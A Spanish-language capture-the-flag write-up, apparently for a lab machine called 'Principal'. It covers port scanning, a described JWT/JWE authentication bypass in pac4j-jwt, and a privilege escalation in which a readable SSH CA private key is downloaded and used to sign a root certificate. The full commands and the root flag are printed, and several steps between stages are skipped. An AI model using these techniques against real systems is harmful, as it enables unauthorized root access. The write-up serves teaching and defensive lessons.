Descubrimiento de puertos Link to heading

Comenzamos con un ping para verificar conectividad y estimar el sistema operativo basándonos en el TTL:

❯ ping -c1 10.129.30.182
PING 10.129.30.182 (10.129.30.182) 56(84) bytes of data.
64 bytes from 10.129.30.182: icmp_seq=1 ttl=63 time=450 ms

TTL de 63 — casi con certeza es un Linux. Procedemos con un escaneo de puertos agresivo:

❯ nmap -p- --open -sS --min-rate 5000 10.129.30.182 -oG nmap/targeted -n -Pn
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 16:49 -0400

Solo dos puertos abiertos: SSH (22) y un HTTP proxy (8080). Vamos a profunzidar en los servicios:

❯ echo -e "10.129.30.182\t\tprincipal.htb" | sudo tee -a /etc/hosts

❯ whatweb http://principal.htb:8080

Nos encontramos con un formulario de login de una plataforma interna llamada “Principal Internal Platform”. Probamos opciones básicas como SQLi, credenciales por defecto (admin:admin, admin:password), pero nada funciona. El botón de “Forgot password?” nos lleva a una página que dice que la función de reseteo no está implementada:

Esto nos da una pista: si no hay reseteo de contraseña, probablemente el sistema espera que las credenciales sean gestionadas por un administrador. Pero antes de rendirnos, revisamos el código fuente de la página y encontramos algo mucho más interesante.

Análisis del JavaScript Link to heading

En el archivo /static/js/app.js descubrimos los endpoints de la API y, crucialmente, cómo funciona el sistema de autenticación:

/**
 * Principal Internal Platform - Client Application
 * Version: 1.2.0
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';

Esto es oro puro. Sabemos que:

  • Usa JWE (JSON Web Encryption) con RSA-OAEP-256 y A128GCM
  • La clave pública está disponible en /api/auth/jwks
  • Los roles posibles son ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
  • El endpoint /api/users lista usuarios (requiere autenticación)
  • El endpoint /api/settings contiene ajustes de configuración

Verificamos que los endpoints requieren autenticación:

❯ curl -s http://principal.htb:8080/api/users -i
HTTP/1.1 401 Unauthorized
{"error":"Unauthorized","message":"Bearer token required"}

Sin token no podemos hacer nada. Es momento de buscar vulnerabilidades en pac4j-jwt 6.0.3.

Explotación Link to heading

CVE-2026-29000 — Inyección PlainJWT en JWE Link to heading

Investigando la versión pac4j-jwt/6.0.3, encontramos que es vulnerable a CVE-2026-29000 con un CVSS de 10.0. La vulnerabilidad permite inyectar un JWT sin firmar (PlainJWT) dentro de un JWE cifrado, de modo que el servidor confía en el contenido del token interno sin verificar la firma.

El PoC es claro: el atacante obtiene la clave pública JWKS, construye un JWE con un payload JWT malicioso (cambiando el rol a ROLE_ADMIN), y el servidor lo acepta porque la vulnerabilidad impide la verificación correcta del encadenamiento JWT-dentro-de-JWE.

Escalada de Privilegios Link to heading

Enumeración del sistema Link to heading

Lo primero: ¿quién soy y qué permisos tengo?

svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)

El usuario pertenece al grupo deployers. Esto es inusual y merece investigación. Buscamos archivos accesibles por este grupo:

svc-deploy@principal:~$ find / -group deployers 2>/dev/null
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca

Encontramos algo muy interesante en /opt/principal/ssh/. Leemos el README:

svc-deploy@principal:~$ cat /opt/principal/ssh/README.txt
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication

Esto es una Autoridad Certificadora SSH. Hay un par de llaves CA en ese directorio. Verificamos la configuración de SSH:

svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub

La directiva TrustedUserCAKeys indica que SSH confía en certificados firmados por la CA. Y nosotros tenemos acceso de lectura a la clave privada ca. Esto es un error grave de configuración —el grupo deployers no debería tener acceso a la clave privada de la CA.

Explotación de la CA SSH Link to heading

El plan es claro:

  1. Descargar la clave privada CA a nuestra máquina atacante
  2. Generar un par de llaves SSH nuevas
  3. Firmar la llave pública con la CA para el principal root
  4. Conectarnos como root usando el certificado firmado

Descargamos la clave CA usando Penelope (nuestro administrador de sesiones):

(Penelope)─(Session [1])> download ca
[•] ⇣ Downloading to /home/kali/.penelope/sessions/principal~10.129.30.182-Linux-x86_64/downloads
 ⤷ [########################################] 100% (4.0 KBytes/4.0 KBytes)

Ahora en nuestra máquina atacante:

❯ cp /home/kali/.penelope/sessions/principal~10.129.30.182-Linux-x86_64/downloads/opt/principal/ssh/ca ca
❯ chmod 600 ca
❯ ssh-keygen -t ed25519 -f my_access -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in my_access
Your public key has been saved in my_access.pub

Firmamos la llave pública con la CA. El truco está en los flags:

  • -s ca — usar la clave privada CA para firmar
  • -I "root_audit" — identity del certificado
  • -n root — principal (usuario para el que será válido el certificado)
  • -V +1h — validez de 1 hora
❯ ssh-keygen -s ca -I "root_audit" -n root -V +1h my_access.pub
Signed user key my_access-cert.pub: id "root_audit" serial 0 for root valid from 2026-06-18T22:38:00 to 2026-06-18T23:39:17

Y ahora, lo más simple: conectarnos como root:

❯ ssh -i my_access root@principal.htb
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

root@principal:~# cat root.txt
fe347d72e5fb53a7386c23dfab4c1b4f

root conseguido.

Lecciones aprendidas Link to heading

  1. Nunca expongas la versión exacta de librerías de autenticación en headers HTTP. X-Powered-By: pac4j-jwt/6.0.3 le regaló al atacante el vector de ataque.
  2. No almacenes contraseñas en texto plano en settings de aplicaciones web.
  3. Protege las claves privadas de la CA SSH. El grupo deployers no debería tener acceso de lectura a /opt/principal/ssh/ca. Una CA comprometida permite firmar certificados para cualquier usuario del sistema.
  4. Usa certificados con validez corta. Al menos usaban -V +1h, limitando la ventana de reuso del certificado firmado.
